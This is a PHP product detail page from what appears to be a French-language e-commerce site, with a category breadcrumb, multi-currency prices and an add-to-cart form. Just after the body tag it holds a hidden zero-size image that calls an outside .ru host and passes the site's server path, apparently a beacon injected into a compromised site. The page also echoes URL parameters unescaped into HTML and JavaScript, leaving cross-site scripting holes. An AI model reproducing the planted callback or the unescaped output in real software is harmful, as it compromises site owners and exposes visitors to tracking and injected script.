<?php
include('lib/config.php');

// Si la page est appeler directement - genre index par Google
if( !isset($_SESSION['pascadre']) ) {
	$script = "<script language='javascript'>";
	$script .= '	open("'.$entr_url.'/index.php?appel=speciaux_achat.php?appel=produit_detail.php?id='.$_GET['id'].'&cat='.@$_GET['cat'].'","_top" );';
	$script .= "</script>";
	echo $script;
}

//$cat = $_SESSION['navigation'];
$cat = @$_GET['cat'];
$produit = get_prod_infos_by_id($_GET['id']);

echo 
"<html>
	<head>
		<title>".$txt['TitreWeb']." - ".$param['telephone_client']."</title>
		<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1'>
		<meta name='description' content='".$txt['MetaDescription']."'>
		<meta name='keywords' content='".$txt['MetaKeyword']."'>
		<link href='styles/style.css' rel='stylesheet' type='text/css'>
		<base target='ACCUEIL'>
	</head>
<body><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
<table bgcolor='#dae5fb' width='$LargeAchat' cellpadding='4' cellspacing='1' align='$Enligne' border='1' >
  <tr>
		<td Valign=top  colspan=2>
";

if( !is_array($produit) ){
 echo "
	<center>"
			.$txt['a1'].
	"</center>";
}
else {
	echo "
			<table width='100%' cellpadding='2' cellspacing='0' height='22' border='0' background=images/bg_main_haut.jpg>
				<tr>
					<td  align=left nowrap>
						&nbsp;&nbsp;<a href='speciaux.php' class=titre>".$txt['accueil']."</a> -";
					if( $cat != 0 ){
						$path = get_cat_path($cat);
						$subCatCtr = count($path);
						
						if( $subCatCtr > 0 ){
							echo "&nbsp;<span class=titre><a href='produits_list.php?cat=".$path[0]."' class=titre>".get_cat_name_by_id($path[0]),"</a>";
				      	if( $subCatCtr > 1 ) {
				         	for($i = 1; $i < $subCatCtr; $i++ )
				            	echo " - <span  class=titre><a href='produits_list.php?cat=".$path[$i]."' class=titre>".get_cat_name_by_id($path[$i])."</a>";
				    		} // Si $subCatCtr > 0
				  		} // $subCatCtr > 0 
				    echo " - <span class=titre><a href='produits_list.php?cat=$cat' class=titre>".get_cat_name_by_id($_GET['cat']).
					 		"</a> > <a href='".$_SERVER['PHP_SELF']."?id=".$_GET['id']."&cat=$cat' class=titre>".
					 		$produit['titre_'.$_SESSION['langue']]."</a>";
					} // si $cat != 0

	echo "
					</td>
			    </tr>
		    </table>  
			</td>
		</tr>
		<tr>
			<td  align='left' nowrap>";

// FIN DE L'AFFICHAGE DU PATH
	$TxCUC_USD = get_TauxVente("CUC"); 
	$TXUSD_CAD = get_TauxVente("CAD"); 
	$TXUSD_EUR = get_TauxVente("EUR"); 
	$SymbCUC	=	get_Symbole("CUC");
	$SymbUSD	=	get_Symbole("USD");
	$SymbCAD	=	get_Symbole("CAD");
	$SymbEUR	=	get_Symbole("EUR");

		$prix_cuc	=	rounder($produit['prix_detail']);
		$prix_us		=	rounder($prix_cuc  * $TxCUC_USD);
		$prix_ca		=	rounder($prix_us * $TXUSD_CAD);
		$prix_eur	=	rounder($prix_us * $TXUSD_EUR);
		

?>
    	<?php
/*				$sql = " SELECT * FROM $mysql_base.photo WHERE NoInvent='".$produit['id']."' AND NoPhoto='".$produit['big']."'";
				$result2 = mysql_query( $sql, $handle );
				if( $result2 &&  mysql_num_rows($result2) ) */
				if( $produit['big'] ) 
					echo "<a href='javascript:VoirZoom(".$produit['id'].");'>";
//					echo "<a href='".$produit['id']."' target=_blank>";
				
//					echo "<a href='photoget_web.php?No=".$produit['id']."&Idx=".$produit['big']."' target=_blank>";
				echo "<img src='photoget_web.php?No=".$produit['id']."&Idx=".$produit['medium']."' border=0 ></a></td>";
 
      ?>
		</td>
		<td width='100%' align=left>
			<span class=titre>
				<?php echo $produit['id']." ".$produit['titre_'.$_SESSION['langue']]." ".$produit['Code']; ?>
			</span>
			<br><br>
			<span class=description>
            	<?=$produit['description_'.$_SESSION['langue']]?>
            	<?=$produit['description_supplementaire_'.$_SESSION['langue']]?><br><br>
			</span>
		</td>
	</tr>
	<tr>
		<td Valign=top width='100%' align=center colspan=2>	
			
			<table width="90%" border=1 align=left cellpadding=4 cellspacing=1>
        <tr> 
          <td width="50%" bgcolor="#E6F1FB"> 
			 	<span class=prix> 
				<?PHP
			 		echo "
					 		$prix_cuc $ - CUC<br>
					 		$prix_us $SymbUSD - USD<br>
							$prix_ca $SymbCAD - CAD<br>	
							$prix_eur $SymbEUR - EUR";
				?>
				</span> </td>
          <td align='center' width="50%" bgcolor="#96B2CB"> 
			     <form name="ajout" action="panier_traite.php?retour=2" method="POST">
              <input type="hidden" name="cat" value="<?=@$_GET['cat']?>">
              <input type="hidden" name="CodePanier" value="1">
              <input type="hidden" name="id" value="<?=$produit['id']?>">
              <input type="hidden" name="Target" value="ACCUEIL">
              <select name="qte" size="1" class="ajout_qte">
				<?php
					for($i=1;$i<=$produit['Qte_Max_Livre'];$i++) {
						echo "<option value='$i' ";
						if( $i == 1 ) 
							echo ' SELECTED';
						echo " >$i</option>";
					}  
				?>
           </select>
              <img src='images/panier.gif' border=0> 
              <input type="submit" name="btpanier" value="<?=$txt['ajouter_votre_panier']?>" class="ajout_submit" >
            </form></td>
        </tr>
        <tr> 
          <td colspan="2"> 
            <a href='envoi_ami.php?cat=<?=$cat?>&id=<?=$produit['id']?>' class='generallinks'> 
           <?=$txt['envoyer_ami']?></a></td>
        </tr>
      </table>
		</td>
	</tr>	
</table>
<?
}

?>
<script language='JavaScript1.2'>
	if( !top.window.frames[1].frames[1] ) 
		open("<?=$entr_url?>/index.php?appel=speciaux_achat.php?appel=produit_detail.php?id=<?=$_GET['id']?>&cat=<?=@$_GET['cat']?>",'_top' );

	function VoirZoom(No){
			str = 'zoom.php?id=' + No;
			 open( str, '_blank','left=10,top=10,width=460,height=500,status=no,toolbar=no,menubar=no,location=no,resizable=no' );
	} // Rafraichie
	function Rafraichie(){
		window.location.reload();
	}
</script>
</body>
</html>
